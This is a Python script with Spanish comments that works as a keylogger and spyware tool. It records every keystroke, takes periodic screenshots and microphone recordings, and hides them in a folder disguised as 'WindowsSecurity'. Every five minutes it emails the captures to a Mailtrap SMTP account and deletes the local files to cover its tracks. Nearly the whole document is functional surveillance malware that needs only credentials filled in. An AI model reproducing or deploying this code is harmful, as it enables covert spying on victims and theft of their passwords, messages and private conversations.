import smtplib
import os
import threading
import time
import sys
import wave
import logging
import sounddevice as sd
import numpy as np
import pyscreenshot as ImageGrab
from PIL import Image
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

USERNAME = "YOUR_USERNAME"
PASSWORD = "YOUR_PASSWORD"

## Configuracion ##
INTERVALO_AUDIO = 60 # segundos
INTERVALO_SCREENSHOT = 60 # segundos
DURACION_AUDIO = 15 # segundos por grabacion

# Carpeta silenciosa.

appdata = os.getenv("APPDATA")
if appdata is None:
    appdata = os.path.expanduser("~")

BASE_DIR = os.path.join(appdata, "WindowsSecurity")

CAPTURA_DIR = "capturas"
LOGS_DIR = "logs"

CAPTURA_DIR = os.path.join(BASE_DIR, "capturas")
LOGS_DIR = os.path.join(BASE_DIR, "logs")

LOG_FILE = os.path.join(LOGS_DIR, "analitycs.txt")

## Crear caarpetas si no existen ##
os.makedirs(CAPTURA_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)

## Teclado ##

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def save_keys(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")

    if key == keyboard.Key.esc:
        send_message_alert("Keylogger detenido", "El keylogger fue detenido manualmente con la tecla ESC.")
        print("🛑 Script detenido por el usuario.")
        os._exit(0) # Detiene todo el proceso inmediatamente.

## Pantalla ## 

def capture_screen():
    contador = 1
    while True:
        imagen = ImageGrab.grab()
        path = os.path.join(CAPTURA_DIR, f"screen_{contador:03d}.png")
        imagen.save(path) # type: ignore
        print(f"Captura de pantalla guardada: {path}")
        contador += 1
        time.sleep(INTERVALO_SCREENSHOT)

## Audio ##

def record_audio():
    contador = 1
    while True:
        fs = 44100
        print(f"Grabando audio {contador}...")
        audio = sd.rec(int(DURACION_AUDIO * fs), samplerate=fs, channels=1)
        sd.wait()

        audio_np = np.array(audio * 32767, dtype=np.int16)
        archivo = os.path.join(CAPTURA_DIR, f"audio_{contador:03d}.wav")
        with wave.open(archivo, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(audio_np.tobytes())

        print(f"Audido guardado: {archivo}")
        contador += 1
        time.sleep(INTERVALO_AUDIO)



# Madar mensaje de alerta.
def send_message_alert(asunto, mensaje):
    sender = "Private person <from@example.com>"
    receiver = "A Test User <to@example.com>"

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = asunto
    msg["Message"] = mensaje

    msg.attach(MIMEBase('text', 'plain'))
    

    try:
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as servidor:
            servidor.starttls()
            servidor.login(USERNAME, PASSWORD)
            servidor.send_message(msg)
        print("📧 Mensaje de detención enviado.")
    except Exception as e:
        print("❌ Error al enviar mensaje de alerta:", e)


## Enviar archivos a mailtrap.
def send_file_for_mailtrap(archivos):
    sender = "Private person <from@example.com>"
    receiver = "A Test USer <to@example.com>"

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg['Subject'] = "reporte"

    for archivo in archivos:
        if not os.path.exists(archivo): continue
        part = MIMEBase('application', 'octet-stream')
        with open(archivo, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(archivo)}')
        msg.attach(part)

    try:
        with smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525) as servidor:
            servidor.starttls()
            servidor.login(USERNAME, PASSWORD)
            servidor.send_message(msg)
        print("Correo enviado con exito.")

        return True
    except Exception as e:
        print("Error al enviar correo:", e)
        return False

## Enviar cada X minutos.
def send_report_perio():
    while True:
        try:
            screen_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("screen_")]
            audio_files = [os.path.join(CAPTURA_DIR, f) for f in os.listdir(CAPTURA_DIR) if f.startswith("audio_")]
            otros_logs = [LOG_FILE] if os.path.exists(LOG_FILE) else []

            archivos = otros_logs + screen_files + audio_files

            # Envia correo y solo si fue exitoso, elimina los archivos.

            if send_file_for_mailtrap(archivos):
                for archivo in archivos:
                    try:
                        os.remove(archivo)
                        print(f"No se pudo eliminar {archivo}")
                    except Exception as e:
                        print(f"No se pudo eliminar {archivo}: {e}")
                    
            else:
                print("EL correo no se envio. Archivos conservados para el proximo intento.")


        except Exception as e:
            print("Error en proceso de envio:", e)


        time.sleep(300) # 300 cada 5 minutos

## Obtener ultimo archivo.

def get_last_file(carpeta, prefijo):
    archivos = [f for f in os.listdir(carpeta) if f.startswith(prefijo)]
    if not archivos:
        return None
    archivos.sort()
    return os.path.join(carpeta, archivos[-1])

## ===== EJEUCION ===== ##

def main():
    threading.Thread(target=send_report_perio, daemon=True).start()
    # Iniciar captura de pantalla en segundo plano.
    threading.Thread(target=capture_screen, daemon=True).start()
    # Iniciar grabacopm de audio en segundo plano.
    threading.Thread(target=record_audio, daemon=True).start()
    # Iniciar escucha de teclado.
    with keyboard.Listener(on_press=save_keys) as listener:
        listener.join()

if __name__ == "__main__":
    main()